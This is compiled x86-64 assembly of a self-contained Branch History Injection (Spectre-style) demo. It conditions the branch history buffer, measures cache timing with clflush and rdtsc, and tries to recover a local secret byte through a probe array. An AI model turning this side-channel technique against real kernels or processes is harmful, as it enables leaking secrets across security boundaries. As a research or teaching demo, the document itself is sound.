	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 5	sdk_version 15, 5
	.globl	_flush_probe_array              ## -- Begin function flush_probe_array
	.p2align	4, 0x90
_flush_probe_array:                     ## @flush_probe_array
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$0, -4(%rbp)
LBB0_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -4(%rbp)                  ## imm = 0x100
	jge	LBB0_4
## %bb.2:                               ##   in Loop: Header=BB0_1 Depth=1
	movl	-4(%rbp), %eax
	shll	$6, %eax
	movslq	%eax, %rcx
	movq	_probe_array@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.3:                               ##   in Loop: Header=BB0_1 Depth=1
	movl	-4(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -4(%rbp)
	jmp	LBB0_1
LBB0_4:
	mfence
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_measure_access_time            ## -- Begin function measure_access_time
	.p2align	4, 0x90
_measure_access_time:                   ## @measure_access_time
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$32, %rsp
	movq	%rdi, -8(%rbp)
	callq	_rdtsc
	movq	%rax, -16(%rbp)
	movq	-8(%rbp), %rax
	movb	(%rax), %al
	movb	%al, -25(%rbp)
	mfence
	callq	_rdtsc
	movq	%rax, -24(%rbp)
	movq	-24(%rbp), %rax
	subq	-16(%rbp), %rax
	addq	$32, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_benign_target                  ## -- Begin function benign_target
	.p2align	4, 0x90
_benign_target:                         ## @benign_target
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_common_init                    ## -- Begin function common_init
	.p2align	4, 0x90
_common_init:                           ## @common_init
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movq	_probe_array@GOTPCREL(%rip), %rdi
	xorl	%esi, %esi
	movl	$16384, %edx                    ## imm = 0x4000
	callq	_memset
	movl	$0, -4(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$16384, -4(%rbp)                ## imm = 0x4000
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-4(%rbp), %rcx
	movq	_probe_array@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-4(%rbp), %eax
	addl	$64, %eax
	movl	%eax, -4(%rbp)
	jmp	LBB3_1
LBB3_4:
	mfence
	callq	_flush_probe_array
	mfence
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_perform_measurement            ## -- Begin function perform_measurement
	.p2align	4, 0x90
_perform_measurement:                   ## @perform_measurement
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movb	%dil, %al
	movb	%al, -5(%rbp)
	movq	%rsi, -16(%rbp)
	leaq	L_.str(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	$-1, -20(%rbp)
	movq	$-1, -32(%rbp)
	movl	$50, -36(%rbp)
	movl	$0, -40(%rbp)
LBB4_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -40(%rbp)                 ## imm = 0x100
	jge	LBB4_8
## %bb.2:                               ##   in Loop: Header=BB4_1 Depth=1
	movl	-40(%rbp), %eax
	shll	$6, %eax
	movslq	%eax, %rcx
	movq	_probe_array@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rdi
	callq	_measure_access_time
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	movslq	-36(%rbp), %rcx
	cmpq	%rcx, %rax
	jge	LBB4_6
## %bb.3:                               ##   in Loop: Header=BB4_1 Depth=1
	cmpq	$-1, -32(%rbp)
	je	LBB4_5
## %bb.4:                               ##   in Loop: Header=BB4_1 Depth=1
	movq	-56(%rbp), %rax
	cmpq	-32(%rbp), %rax
	jge	LBB4_6
LBB4_5:                                 ##   in Loop: Header=BB4_1 Depth=1
	movq	-56(%rbp), %rax
	movq	%rax, -32(%rbp)
	movl	-40(%rbp), %eax
	movl	%eax, -20(%rbp)
LBB4_6:                                 ##   in Loop: Header=BB4_1 Depth=1
	jmp	LBB4_7
LBB4_7:                                 ##   in Loop: Header=BB4_1 Depth=1
	movl	-40(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -40(%rbp)
	jmp	LBB4_1
LBB4_8:
	cmpl	$-1, -20(%rbp)
	je	LBB4_12
## %bb.9:
	movq	-16(%rbp), %rsi
	movl	-20(%rbp), %eax
                                        ## kill: def $al killed $al killed $eax
	movsbl	%al, %edx
	movl	-20(%rbp), %ecx
	movq	-32(%rbp), %r8
	leaq	L_.str.1(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-20(%rbp), %eax
	movzbl	-5(%rbp), %ecx
	cmpl	%ecx, %eax
	jne	LBB4_11
## %bb.10:
	movq	-16(%rbp), %rsi
	leaq	L_.str.2(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	$1, -4(%rbp)
	jmp	LBB4_13
LBB4_11:
	movq	-16(%rbp), %rsi
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	$0, -4(%rbp)
	jmp	LBB4_13
LBB4_12:
	movq	-16(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	$0, -4(%rbp)
LBB4_13:
	movl	-4(%rbp), %eax
	addq	$64, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_leak_gadget_bhi                ## -- Begin function leak_gadget_bhi
	.p2align	4, 0x90
_leak_gadget_bhi:                       ## @leak_gadget_bhi
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movb	%dil, %al
	movb	%al, -1(%rbp)
	movzbl	-1(%rbp), %eax
	shll	$6, %eax
	movslq	%eax, %rcx
	movq	_probe_array@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_branch_history_conditioner_bhi ## -- Begin function branch_history_conditioner_bhi
	.p2align	4, 0x90
_branch_history_conditioner_bhi:        ## @branch_history_conditioner_bhi
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$0, -4(%rbp)
LBB6_1:                                 ## =>This Inner Loop Header: Depth=1
	movl	-4(%rbp), %eax
	cmpl	$5000, %eax                     ## imm = 0x1388
	jge	LBB6_7
## %bb.2:                               ##   in Loop: Header=BB6_1 Depth=1
	movl	-4(%rbp), %eax
	movl	$2, %ecx
	cltd
	idivl	%ecx
	cmpl	$0, %edx
	jne	LBB6_4
## %bb.3:                               ##   in Loop: Header=BB6_1 Depth=1
	## InlineAsm Start
Ltmp0:
	jmp	Ltmp0+4
	## InlineAsm End
	jmp	LBB6_5
LBB6_4:                                 ##   in Loop: Header=BB6_1 Depth=1
	## InlineAsm Start
	nop
	## InlineAsm End
LBB6_5:                                 ##   in Loop: Header=BB6_1 Depth=1
	leaq	_leak_gadget_bhi(%rip), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	## InlineAsm Start
	callq	*%rax
	## InlineAsm End
	mfence
## %bb.6:                               ##   in Loop: Header=BB6_1 Depth=1
	movl	-4(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -4(%rbp)
	jmp	LBB6_1
LBB6_7:
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	callq	_common_init
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	L_.str.6(%rip), %rdi
	movb	$0, %al
	callq	_printf
	callq	_branch_history_conditioner_bhi
	mfence
	callq	_flush_probe_array
	lfence
	leaq	L_.str.7(%rip), %rdi
	movb	$0, %al
	callq	_printf
	leaq	_benign_target(%rip), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movzbl	_secret_bhi_data(%rip), %edi
	callq	*%rax
	lfence
	leaq	L_.str.8(%rip), %rsi
	movzbl	_secret_bhi_data(%rip), %edi
	callq	_perform_measurement
	movzbl	_secret_bhi_data(%rip), %esi
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	xorl	%eax, %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.p2align	4, 0x90                         ## -- Begin function rdtsc
_rdtsc:                                 ## @rdtsc
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.comm	_probe_array,16384,4            ## @probe_array
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"Measuring cache timings...\n"

L_.str.1:                               ## @.str.1
	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"

L_.str.2:                               ## @.str.2
	.asciz	"SUCCESS! Leaked the actual %s.\n"

L_.str.3:                               ## @.str.3
	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"

L_.str.4:                               ## @.str.4
	.asciz	"No %s leaked or could not detect leakage.\n"

	.section	__DATA,__data
	.globl	_secret_bhi_data                ## @secret_bhi_data
_secret_bhi_data:
	.byte	72                              ## 0x48

	.section	__TEXT,__cstring,cstring_literals
L_.str.5:                               ## @.str.5
	.asciz	"\n--- Running Branch History Injection (BHI) Demo ---\n"

L_.str.6:                               ## @.str.6
	.asciz	"Conditioning Branch History Buffer (BHB)...\n"

L_.str.7:                               ## @.str.7
	.asciz	"Triggering victim (e.g., a kernel syscall with indirect branch)...\n"

L_.str.8:                               ## @.str.8
	.asciz	"BHI secret"

L_.str.9:                               ## @.str.9
	.asciz	"Actual secret data: %c\n"

.subsections_via_symbols
